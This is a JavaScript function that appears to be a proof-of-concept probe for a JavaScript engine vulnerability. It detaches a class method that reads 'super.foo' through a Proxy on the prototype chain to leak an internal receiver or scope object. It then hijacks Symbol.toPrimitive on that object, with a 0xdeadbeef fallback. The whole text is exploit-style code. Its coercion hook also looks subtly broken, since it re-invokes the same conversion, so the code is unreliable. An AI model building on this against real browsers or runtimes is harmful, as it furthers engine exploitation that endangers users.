const patchedReceivers = new WeakSet();

function leakScope() {
    try {
        log("===== LEAK SCOPE START =====", 'debug');
        
        class Leaker {
            leak() {
                log("[Leaker] Accessing super.foo", 'debug');
                return super.foo;
            }
        }

        log("Setting up prototype chain", 'debug');
        
        const handler = {
            get(target, propertyName, receiver) {
                if (propertyName === Symbol.toPrimitive) {
                    return Reflect.get(target, propertyName, receiver);
                }
                
                log(`[Proxy] Intercepted: ${String(propertyName)}`, 'debug');
                
                if (!patchedReceivers.has(receiver)) {
                    patchedReceivers.add(receiver);
                    
                    receiver[Symbol.toPrimitive] = function(hint) {
                        try {
                            log(`[Coercion] Hint: ${hint}`, 'warn');
                            log(`[Coercion] this type: ${typeof this}`, 'debug');
                            
                            if (hint === 'number') {
                                // SIMPLIFIED: Let the engine handle conversion
                                return Number(this);
                            }
                            return String(this);
                        } catch (e) {
                            log(`[Coercion] Fallback failed: ${e}`, 'error');
                            return 0xdeadbeef;
                        }
                    };
                }
                
                return receiver;
            }
        };

        Leaker.prototype.__proto__ = new Proxy({}, handler);
        log(`Proxy set? ${!!Leaker.prototype.__proto__}`, 'debug');

        const { leak } = Leaker.prototype;
        log("Calling leak()", 'debug');
        
        const result = (() => leak())();
        log(`Result type: ${typeof result}`, 'info');
        return result;
    } catch (e) {
        log(`leakScope error: ${e.message}`, 'error');
        return null;
    }
}